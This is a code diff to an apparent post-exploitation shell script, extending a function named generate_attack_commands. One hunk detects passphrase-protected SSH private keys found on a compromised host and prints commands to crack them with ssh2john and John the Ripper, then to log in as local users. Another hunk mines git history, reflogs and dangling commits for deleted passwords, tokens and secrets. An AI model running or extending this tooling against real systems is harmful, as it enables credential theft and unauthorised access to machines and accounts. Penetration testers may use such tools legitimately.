@@ -828,6 +828,26 @@ generate_attack_commands() {
             echo "[ SSH KEY: $(basename "${kf}") ]"
             echo "------------------------------------------------------------"
             echo "chmod 600 ${kf}"
+            # Detect passphrase-protected keys (OpenSSH + PEM formats)
+            local _key_encrypted="no"
+            if grep -qE '^Proc-Type:.*ENCRYPTED|bcrypt|^-----BEGIN ENCRYPTED' "${kf}" 2>/dev/null; then
+                _key_encrypted="yes"
+            elif grep -qE '^-----BEGIN OPENSSH PRIVATE KEY-----' "${kf}" 2>/dev/null \
+                 && ssh-keygen -y -P '' -f "${kf}" >/dev/null 2>&1; then
+                _key_encrypted="no"
+            elif grep -qE '^-----BEGIN OPENSSH PRIVATE KEY-----' "${kf}" 2>/dev/null; then
+                _key_encrypted="yes"
+            fi
+            if [[ "${_key_encrypted}" == "yes" ]]; then
+                echo "# [!] Key is PASSPHRASE-PROTECTED — crack before SSH use:"
+                echo "ssh2john ${kf} > ${kf}.hash"
+                if command -v crackr &>/dev/null; then
+                    echo "crackr -f ${kf}.hash                    # auto-detect SSH mode (22921)"
+                else
+                    echo "john --wordlist=/usr/share/wordlists/rockyou.txt ${kf}.hash"
+                fi
+                echo "# Then use the cracked passphrase when prompted below:"
+            fi
             if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
                 awk -F: '$3 >= 1000 && $3 < 65534 {print "ssh -i '"${kf}"' "$1"@'"${THIS_HOST_IP}"'"}' \
                     "${OUTDIR}/creds/passwd.txt" 2>/dev/null | head -5
@@ -1379,6 +1399,26 @@ generate_attack_commands() {
                 echo "git -C '${repo_dir}' log --all -p 2>/dev/null | grep -iE '^\\+.*pass|^\\+.*secret|^\\+.*token' | head -20"
                 echo "# Check .git/config for auth tokens in remote URLs:"
                 echo "grep -E 'url\\s*=' '${git_dir}/config' 2>/dev/null"
+                # Commit-message archaeology — catches "Removed staging script" / "Deleted creds" patterns
+                echo "# Commit messages that mention removal/secrets (flag candidates for 'git show'):"
+                echo "git -C '${repo_dir}' log --all --oneline 2>/dev/null | grep -iE 'remov|delet|secret|cred|pass|key|backup|\\.env|config|stag' | head -20"
+                echo "# Same via --grep across full message bodies:"
+                echo "git -C '${repo_dir}' log --all --pretty=format:'%h %s' --grep='remov\\|delet\\|cred\\|pass\\|secret\\|backup\\|stag' -i 2>/dev/null | head -20"
+                echo "# Dangling commits / reflog — files removed from all branches may still be reachable:"
+                echo "git -C '${repo_dir}' reflog 2>/dev/null | head -20"
+                echo "git -C '${repo_dir}' fsck --lost-found 2>/dev/null | head -20"
+                echo "# For each hit above, inspect the diff (substitute the short SHA):"
+                echo "git -C '${repo_dir}' show <SHA>"
+                # Live-mine: if any flagged commits are found right now, print them with SHAs
+                if command -v git &>/dev/null && [[ -d "${git_dir}" ]]; then
+                    local _flagged
+                    _flagged=$(git -C "${repo_dir}" log --all --oneline 2>/dev/null \
+                        | grep -iE 'remov|delet|secret|cred|pass|key|backup|\.env|stag' | head -10)
+                    if [[ -n "${_flagged}" ]]; then
+                        echo "# [+] FLAGGED COMMITS found right now in ${repo_dir}:"
+                        while IFS= read -r _c; do echo "#     ${_c}"; done <<< "${_flagged}"
+                    fi
+                fi
                 echo ""
             done < "${OUTDIR}/files/git_repos.txt"
         fi
